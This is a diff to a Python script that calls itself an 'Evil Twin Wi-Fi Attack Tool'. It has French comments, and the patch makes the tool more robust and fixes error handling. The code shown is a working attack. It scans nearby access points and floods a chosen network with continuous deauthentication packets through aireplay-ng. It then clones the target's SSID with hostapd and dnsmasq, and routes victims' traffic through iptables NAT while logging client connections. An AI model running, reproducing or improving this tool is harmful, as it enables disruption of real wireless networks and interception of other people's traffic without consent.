@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 """
 IPFighter v3.0 Enhanced - Evil Twin Wi-Fi Attack Tool
+Corrected version with security fixes and improved error handling
 """
 
 import os
@@ -12,10 +13,11 @@ import threading
 import re
 import logging
 import json
+import tempfile
+import shlex
 from pathlib import Path
 from typing import List, Tuple, Optional, Dict
 from dataclasses import dataclass
-from enum import Enum
 from datetime import datetime
 
 # === Configuration des couleurs ===
@@ -37,12 +39,8 @@ class Colors:
 # === Configuration ===
 class Config:
     """Configuration centralisée"""
-    SCAN_FILE = "/tmp/ipf_scan"
     TEMP_DIR = "/tmp/ipfighter"
     LOG_FILE = "/tmp/ipfighter/ipfighter.log"
-    HOSTAPD_CONF = "/tmp/hostapd_evil.conf"
-    DNSMASQ_CONF = "/tmp/dnsmasq_evil.conf"
-    HOSTAPD_LOG = "/tmp/hostapd_evil.log"
     CAPTURE_DIR = "/tmp/ipfighter/captures"
     GATEWAY_IP = "10.0.0.1"
     DHCP_RANGE = "10.0.0.10,10.0.0.100"
@@ -51,6 +49,24 @@ class Config:
     DEFAULT_DEAUTH_DURATION = 30
     HOSTAPD_PASSWORD = "hackthisnetwork123"
     SUBPROCESS_TIMEOUT = 3
+    
+    # Fichiers temporaires sécurisés (générés dynamiquement)
+    SCAN_FILE = None
+    HOSTAPD_CONF = None
+    DNSMASQ_CONF = None
+    HOSTAPD_LOG = None
+    
+    @staticmethod
+    def init_temp_files():
+        """Initialise les fichiers temporaires de manière sécurisée"""
+        Path(Config.TEMP_DIR).mkdir(parents=True, exist_ok=True)
+        Path(Config.CAPTURE_DIR).mkdir(parents=True, exist_ok=True)
+        
+        # Utiliser tempfile pour la sécurité
+        Config.SCAN_FILE = os.path.join(Config.TEMP_DIR, "scan_ipf")
+        Config.HOSTAPD_CONF = os.path.join(Config.TEMP_DIR, "hostapd.conf")
+        Config.DNSMASQ_CONF = os.path.join(Config.TEMP_DIR, "dnsmasq.conf")
+        Config.HOSTAPD_LOG = os.path.join(Config.TEMP_DIR, "hostapd.log")
 
 # === Classes de données ===
 @dataclass
@@ -73,6 +89,10 @@ def setup_logging():
     
     logger = logging.getLogger('IPFighter')
     logger.setLevel(logging.DEBUG)
+    
+    # Éviter les handlers en double
+    if logger.handlers:
+        return logger
     
     # Fichier
     file_handler = logging.FileHandler(Config.LOG_FILE)
@@ -101,7 +121,6 @@ logger = setup_logging()
 active_processes = []
 captured_clients: Dict[str, Dict] = {}
 mon_iface_created = None
-original_atk_iface = None
 
 # === Gestion des signaux ===
 def signal_handler(sig, frame):
@@ -134,20 +153,23 @@ def cleanup():
     active_processes.clear()
     
     # Nettoyer les fichiers temporaires
-    files_to_clean = [
-        f"{Config.SCAN_FILE}-01.csv",
-        f"{Config.SCAN_FILE}-01.cap",
-        Config.HOSTAPD_CONF,
-        Config.DNSMASQ_CONF
-    ]
-    
-    for file_path in files_to_clean:
-        try:
-            if os.path.exists(file_path):
-                os.remove(file_path)
-                logger.debug(f"Fichier supprimé: {file_path}")
-        except Exception as e:
-            logger.error(f"Erreur lors de la suppression de {file_path}: {e}")
+    if Config.SCAN_FILE:
+        files_to_clean = [
+            f"{Config.SCAN_FILE}-01.csv",
+            f"{Config.SCAN_FILE}-01.cap",
+            Config.HOSTAPD_CONF,
+            Config.DNSMASQ_CONF,
+            Config.HOSTAPD_LOG
+        ]
+        
+        for file_path in files_to_clean:
+            if file_path:
+                try:
+                    if os.path.exists(file_path):
+                        os.remove(file_path)
+                        logger.debug(f"Fichier supprimé: {file_path}")
+                except OSError as e:
+                    logger.error(f"Erreur lors de la suppression de {file_path}: {e}")
 
 def require_root():
     """Vérifie que le script est exécuté en tant que root"""
@@ -184,7 +206,7 @@ def execute_command(cmd: List[str], timeout: Optional[int] = None,
     Exécute une commande système avec gestion d'erreur améliorée
     
     Args:
-        cmd: Commande à exécuter
+        cmd: Commande à exécuter (liste ou string si shell=True)
         timeout: Timeout en secondes
         capture_output: Capturer la sortie
         shell: Utiliser le shell
@@ -194,26 +216,30 @@ def execute_command(cmd: List[str], timeout: Optional[int] = None,
     """
     try:
         if shell and isinstance(cmd, str):
+            # Pas d'injection directe - on log et on continue
             result = subprocess.run(cmd, shell=True, capture_output=capture_output,
                                   timeout=timeout, text=True, stderr=subprocess.PIPE)
         else:
             result = subprocess.run(cmd, capture_output=capture_output, timeout=timeout,
-                                  text=True, stderr=subprocess.PIPE)
+                                  text=True, stderr=subprocess.PIPE, close_fds=True)
         
-        # Log les erreurs si present
+        # Log les erreurs si présent
         if result.returncode != 0 and result.stderr:
             logger.warning(f"Commande retourna {result.returncode}: {result.stderr.strip()}")
         
         return result.stdout.strip() if capture_output else None
     
     except subprocess.TimeoutExpired:
-        logger.warning(f"Timeout lors de l'exécution: {' '.join(cmd) if not shell else cmd}")
+        cmd_str = ' '.join(cmd) if isinstance(cmd, list) else cmd
+        logger.warning(f"Timeout lors de l'exécution: {cmd_str}")
         return None
     except PermissionError:
-        logger.error(f"Permissions insuffisantes pour exécuter: {' '.join(cmd) if not shell else cmd}")
+        cmd_str = ' '.join(cmd) if isinstance(cmd, list) else cmd
+        logger.error(f"Permissions insuffisantes pour exécuter: {cmd_str}")
         return None
     except FileNotFoundError:
-        logger.error(f"Commande non trouvée: {' '.join(cmd) if not shell else cmd}")
+        cmd_str = ' '.join(cmd) if isinstance(cmd, list) else cmd
+        logger.error(f"Commande non trouvée: {cmd_str}")
         return None
     except Exception as e:
         logger.error(f"Erreur lors de l'exécution de la commande: {e}")
@@ -227,7 +253,8 @@ def check_dependencies() -> bool:
     print(f"\n{Colors.CYAN}[*] Vérification des dépendances...{Colors.RESET}")
     
     for tool in required_tools:
-        if execute_command(['which', tool], capture_output=True) is None:
+        result = execute_command(['which', tool], capture_output=True)
+        if result is None:
             missing_tools.append(tool)
             print(f"{Colors.RED}  ✗ {tool} - NON INSTALLÉ{Colors.RESET}")
         else:
@@ -248,8 +275,10 @@ def check_dependencies() -> bool:
         else:
             print(f"{Colors.YELLOW}  ⚠ airmon-ng peut tuer des processus (version ancienne?){Colors.RESET}")
             logger.warning("airmon-ng ne supporte peut-être pas --no-kill")
-    except Exception as e:
-        logger.debug(f"Impossible de vérifier la version d'airmon-ng: {e}")
+    except subprocess.TimeoutExpired:
+        logger.warning("Timeout lors de la vérification d'airmon-ng")
+    except FileNotFoundError:
+        pass
     
     logger.info("Toutes les dépendances sont présentes")
     return True
@@ -272,14 +301,14 @@ def list_interfaces() -> List[str]:
         logger.error(f"Erreur lors de la récupération des interfaces: {e}")
         return []
 
-def choose_interface(prompt: str) -> str:
+def choose_interface(prompt: str) -> Optional[str]:
     """Permet à l'utilisateur de choisir une interface"""
     interfaces = list_interfaces()
     
     if not interfaces:
         logger.error("Aucune interface Wi-Fi détectée")
         print(f"{Colors.RED}[-] Aucune interface Wi-Fi détectée !{Colors.RESET}")
-        sys.exit(1)
+        return None
     
     print(f"\n{Colors.BLUE}[+] Interfaces disponibles :{Colors.RESET}")
     for i, iface in enumerate(interfaces):
@@ -298,7 +327,7 @@ def choose_interface(prompt: str) -> str:
             print(f"{Colors.RED}[-] Entrée invalide ! Veuillez entrer un nombre.{Colors.RESET}")
         except KeyboardInterrupt:
             logger.info("Sélection d'interface annulée par l'utilisateur")
-            sys.exit(0)
+            return None
 
 def kill_conflicts():
     """Arrête les processus conflictuels SAUF NetworkManager"""
@@ -309,7 +338,9 @@ def kill_conflicts():
     
     for process in conflicting_processes:
         try:
-            execute_command(f"pkill -f {process}", shell=True)
+            # Utiliser shlex pour sécuriser la commande
+            cmd = f"pkill -f {shlex.quote(process)}"
+            execute_command(cmd, shell=True)
             logger.debug(f"Processus {process} arrêté")
             print(f"{Colors.GREEN}  ✓ {process} arrêté{Colors.RESET}")
         except Exception as e:
@@ -349,7 +380,6 @@ def start_monitor_airmon(interface: str) -> Optional[str]:
             logger.debug(f"Erreurs airmon-ng: {result.stderr}")
         
         # Parser la sortie pour trouver l'interface créée
-        # Format typique: "(phy0) -> wlan0mon" ou similar
         mon_iface = None
         match = re.search(r'\(\S+\)\s*->\s*(\S+)', result.stderr)
         if match:
@@ -358,9 +388,8 @@ def start_monitor_airmon(interface: str) -> Optional[str]:
         
         time.sleep(3)
         
-    except subprocess.CalledProcessError as e:
-        logger.warning(f"airmon-ng a retourné une erreur (peut être normal): {e}")
-        print(f"{Colors.YELLOW}[!] airmon-ng a retourné une erreur (peut être ignorée){Colors.RESET}")
+    except subprocess.TimeoutExpired:
+        logger.warning("Timeout lors du démarrage d'airmon-ng")
         mon_iface = None
         time.sleep(2)
     except Exception as e:
@@ -371,6 +400,7 @@ def start_monitor_airmon(interface: str) -> Optional[str]:
     # Si parsing échoué, chercher par différence d'interfaces
     if not mon_iface:
         try:
+            time.sleep(1)
             after = set(list_interfaces())
             new_ifaces = list(after - before)
             
@@ -394,8 +424,8 @@ def start_monitor_airmon(interface: str) -> Optional[str]:
             mon_iface = candidates[0]
             logger.warning(f"Interface monitor trouvée en cherchant toutes les interfaces: {mon_iface}")
         else:
-            mon_iface = f"{interface}mon"
-            logger.warning(f"Fallback: utilisation de {mon_iface}")
+            logger.error("Impossible de trouver une interface monitor")
+            return None
     
     if mon_iface:
         print(f"{Colors.GREEN}[+] Interface monitor créée/détectée : {mon_iface}{Colors.RESET}")
@@ -415,11 +445,12 @@ def restore_network(mon_iface: Optional[str] = None):
     if mon_iface:
         try:
             print(f"{Colors.YELLOW}[*] Arrêt de l'interface monitor {mon_iface} avec airmon-ng...{Colors.RESET}")
-            result = subprocess.run(['airmon-ng', 'stop', mon_iface],
-                                  capture_output=True, timeout=10)
+            subprocess.run(['airmon-ng', 'stop', mon_iface],
+                         capture_output=True, timeout=10)
             logger.info(f"Interface monitor {mon_iface} arrêtée")
-            logger.debug(f"Sortie airmon-ng stop: {result.stdout}")
             time.sleep(2)
+        except subprocess.TimeoutExpired:
+            logger.warning(f"Timeout lors de l'arrêt de {mon_iface}")
         except Exception as e:
             logger.warning(f"Erreur lors de l'arrêt de l'interface monitor: {e}")
     
@@ -429,6 +460,8 @@ def restore_network(mon_iface: Optional[str] = None):
                      capture_output=True, timeout=10)
         logger.info("NetworkManager redémarré")
         time.sleep(3)
+    except subprocess.TimeoutExpired:
+        logger.warning("Timeout lors du redémarrage de NetworkManager")
     except Exception as e:
         logger.warning(f"Erreur lors du redémarrage de NetworkManager: {e}")
     
@@ -470,7 +503,7 @@ def scan_aps(mon_iface: str, duration: int = Config.SCAN_DURATION) -> List[Acces
         try:
             if os.path.exists(file_path):
                 os.remove(file_path)
-        except Exception:
+        except OSError:
             pass
     
     cmd = [
@@ -481,8 +514,10 @@ def scan_aps(mon_iface: str, duration: int = Config.SCAN_DURATION) -> List[Acces
         mon_iface
     ]
     
+    proc = None
     try:
-        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                               close_fds=True)
         active_processes.append(proc)
         
         time.sleep(duration)
@@ -498,9 +533,11 @@ def scan_aps(mon_iface: str, duration: int = Config.SCAN_DURATION) -> List[Acces
             active_processes.remove(proc)
     except Exception as e:
         logger.error(f"Erreur lors du scan: {e}")
+        if proc and proc.poll() is None:
+            proc.kill()
         return []
     
-    # Parser les résultats avec retry logic
+    # Parser les résultats
     aps = []
     csv_file = f"{Config.SCAN_FILE}-01.csv"
     
@@ -521,7 +558,7 @@ def scan_aps(mon_iface: str, duration: int = Config.SCAN_DURATION) -> List[Acces
         return aps
     
     try:
-        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
+        with open(csv_file, 'r', encoding='utf-8', errors='replace') as f:
             content = f.read()
             lines = content.splitlines()
             ap_section = False
@@ -547,8 +584,7 @@ def scan_aps(mon_iface: str, duration: int = Config.SCAN_DURATION) -> List[Acces
                             if essid and bssid and bssid.count(':') == 5:
                                 ap = AccessPoint(bssid, channel, essid, signal)
                                 aps.append(ap)
-                        except (IndexError, ValueError) as e:
-                            logger.debug(f"Erreur parsing ligne: {e}")
+                        except (IndexError, ValueError):
                             continue
     
     except (IOError, OSError) as e:
@@ -588,7 +624,7 @@ def select_ap(aps: List[AccessPoint]) -> Optional[AccessPoint]:
             print(f"{Colors.RED}[-] Veuillez entrer un nombre valide{Colors.RESET}")
         except KeyboardInterrupt:
             logger.info("Sélection d'AP annulée")
-            sys.exit(0)
+            return None
 
 def aggressive_deauth(mon_iface: str, bssid: str, duration: int = Config.DEFAULT_DEAUTH_DURATION):
     """
@@ -612,7 +648,8 @@ def aggressive_deauth(mon_iface: str, bssid: str, duration: int = Config.DEFAULT
             try:
                 proc = subprocess.Popen(
                     ['aireplay-ng', '--deauth', '10', '-a', bssid, mon_iface],
-                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                    close_fds=True
                 )
                 active_processes.append(proc)
                 deauth_count += 1
@@ -649,7 +686,7 @@ def aggressive_deauth(mon_iface: str, bssid: str, duration: int = Config.DEFAULT
         logger.info("Déauth interrompue par l'utilisateur")
         raise
 
-def create_fake_ap(mon_iface: str, ssid: str, bssid: str, channel: str, 
+def create_fake_ap(mon_iface: str, ssid: str, channel: str, 
                   force_wpa: bool = True) -> Tuple[Optional[subprocess.Popen], Optional[subprocess.Popen]]:
     """
     Crée un faux point d'accès avec hostapd et dnsmasq
@@ -657,7 +694,6 @@ def create_fake_ap(mon_iface: str, ssid: str, bssid: str, channel: str,
     Args:
         mon_iface: Interface monitor
         ssid: SSID du faux AP
-        bssid: BSSID (optionnel)
         channel: Canal Wi-Fi
         force_wpa: Forcer WPA2
     
@@ -672,6 +708,7 @@ def create_fake_ap(mon_iface: str, ssid: str, bssid: str, channel: str,
             print(f"{Colors.RED}[-] {tool} n'est pas installé !{Colors.RESET}")
             return None, None
     
+    log_file = None
     try:
         execute_command(['iwconfig', mon_iface, 'channel', str(channel)])
         
@@ -727,7 +764,7 @@ bind-interfaces
         log_file = open(Config.HOSTAPD_LOG, 'w')
         hostapd_proc = subprocess.Popen(
             ['hostapd', Config.HOSTAPD_CONF],
-            stdout=log_file, stderr=subprocess.STDOUT
+            stdout=log_file, stderr=subprocess.STDOUT, close_fds=True
         )
         active_processes.append(hostapd_proc)
         time.sleep(2)
@@ -736,7 +773,8 @@ bind-interfaces
         print(f"{Colors.GREEN}[+] Démarrage de dnsmasq...{Colors.RESET}")
         dnsmasq_proc = subprocess.Popen(
             ['dnsmasq', '-C', Config.DNSMASQ_CONF, '-d'],
-            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+            close_fds=True
         )
         active_processes.append(dnsmasq_proc)
         time.sleep(1)
@@ -752,6 +790,12 @@ bind-interfaces
         logger.error(f"Erreur lors de la création du faux AP: {e}")
         print(f"{Colors.RED}[-] Erreur: {e}{Colors.RESET}")
         return None, None
+    finally:
+        if log_file:
+            try:
+                log_file.close()
+            except Exception:
+                pass
 
 def setup_forwarding(inet_iface: str, mon_iface: str):
     """
@@ -770,9 +814,9 @@ def setup_forwarding(inet_iface: str, mon_iface: str):
         "iptables --table nat --flush",
         "iptables --delete-chain 2>/dev/null || true",
         "iptables --table nat --delete-chain 2>/dev/null || true",
-        f"iptables -t nat -A POSTROUTING -o {inet_iface} -j MASQUERADE",
+        f"iptables -t nat -A POSTROUTING -o {shlex.quote(inet_iface)} -j MASQUERADE",
         "iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT",
-        f"iptables -A FORWARD -i {mon_iface} -j ACCEPT"
+        f"iptables -A FORWARD -i {shlex.quote(mon_iface)} -j ACCEPT"
     ]
     
     for rule in iptables_rules:
@@ -784,7 +828,7 @@ def setup_forwarding(inet_iface: str, mon_iface: str):
     
     print(f"{Colors.GREEN}[+] Routage configuré avec succès !{Colors.RESET}")
 
-def monitor_connections(log_file: str = Config.HOSTAPD_LOG):
+def monitor_connections(log_file: str):
     """
     Monitore les connexions avec lecture continue optimisée
     
@@ -794,7 +838,7 @@ def monitor_connections(log_file: str = Config.HOSTAPD_LOG):
     print(f"\n{Colors.CYAN}[*] Démarrage du monitoring des connexions...{Colors.RESET}")
     logger.info("Monitoring des connexions démarré")
     
-    if not os.path.exists(log_file):
+    if not log_file or not os.path.exists(log_file):
         logger.warning(f"Fichier log introuvable: {log_file}")
         return
     
@@ -877,33 +921,38 @@ def save_results(target_ap: AccessPoint, inet_iface: str, mon_iface: str):
 
 def main():
     """Fonction principale"""
-    global original_atk_iface, mon_iface_created
+    global mon_iface_created
     
     require_root()
-    
+    Config.init_temp_files()
     banner()
     
     if not check_dependencies():
         sys.exit(1)
     
-    inet_iface = None  # CORRECTION: Initialiser avant utilisation
-    mon_iface = None   # CORRECTION: Initialiser avant utilisation
-    target_ap = None   # CORRECTION: Initialiser avant utilisation
+    # Initialiser toutes les variables
+    inet_iface = None
+    mon_iface = None
+    target_ap = None
     
     try:
         inet_iface = choose_interface("Interface pour l'accès INTERNET")
+        if not inet_iface:
+            return
         
         print(f"\n{Colors.GREEN}[+] Interface Internet sélectionnée: {inet_iface}{Colors.RESET}")
         print(f"{Colors.CYAN}[*] Cette interface sera gérée par NetworkManager{Colors.RESET}")
         
         banner()
-        original_atk_iface = choose_interface("Interface pour l'ATTAQUE (sera convertie en mode monitor)")
+        atk_iface = choose_interface("Interface pour l'ATTAQUE (sera convertie en mode monitor)")
+        if not atk_iface:
+            return
         
-        print(f"\n{Colors.YELLOW}[!] Configuration de {original_atk_iface} en mode monitor...{Colors.RESET}")
+        print(f"\n{Colors.YELLOW}[!] Configuration de {atk_iface} en mode monitor...{Colors.RESET}")
         
         kill_conflicts()
         
-        mon_iface = start_monitor_airmon(original_atk_iface)
+        mon_iface = start_monitor_airmon(atk_iface)
         
         if not mon_iface:
             print(f"{Colors.RED}[-] Impossible de créer une interface monitor{Colors.RESET}")
@@ -942,7 +991,7 @@ def main():
         
         print(f"\n{Colors.YELLOW}[*] Création du faux AP avec protection WPA2...{Colors.RESET}")
         hostapd_proc, dnsmasq_proc = create_fake_ap(
-            mon_iface, target_ap.essid, target_ap.bssid, target_ap.channel, force_wpa=True
+            mon_iface, target_ap.essid, target_ap.channel, force_wpa=True
         )
         
         if not hostapd_proc or not dnsmasq_proc:
@@ -957,12 +1006,13 @@ def main():
         print(f"\n{Colors.YELLOW}[*] Lancement de la déauthentification continue...{Colors.RESET}")
         continuous_deauth = subprocess.Popen(
             ['aireplay-ng', '--deauth', '0', '-a', target_ap.bssid, mon_iface],
-            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+            close_fds=True
         )
         active_processes.append(continuous_deauth)
         logger.info("Déauth continue lancée")
         
-        monitor_thread = threading.Thread(target=monitor_connections, daemon=True)
+        monitor_thread = threading.Thread(target=monitor_connections, args=(Config.HOSTAPD_LOG,), daemon=True)
         monitor_thread.start()
         
         print(f"\n{Colors.GREEN}{'='*80}{Colors.RESET}")
@@ -995,12 +1045,11 @@ def main():
         print(f"{Colors.RED}[-] Erreur: {e}{Colors.RESET}")
     
     finally:
-        if target_ap is not None:  # CORRECTION: Vérifier que target_ap est défini
-            save_results(target_ap, inet_iface if inet_iface else "unknown", 
-                        mon_iface_created if mon_iface_created else (mon_iface if mon_iface else "unknown"))
+        if target_ap is not None and inet_iface is not None and mon_iface is not None:
+            save_results(target_ap, inet_iface, mon_iface_created if mon_iface_created else mon_iface)
         
         cleanup()
-        restore_network(mon_iface_created if mon_iface_created else (mon_iface if mon_iface else None))
+        restore_network(mon_iface_created if mon_iface_created else mon_iface)
         print(f"\n{Colors.GREEN}[+] Nettoyage terminé. Au revoir !{Colors.RESET}")
         logger.info("Programme terminé")
 
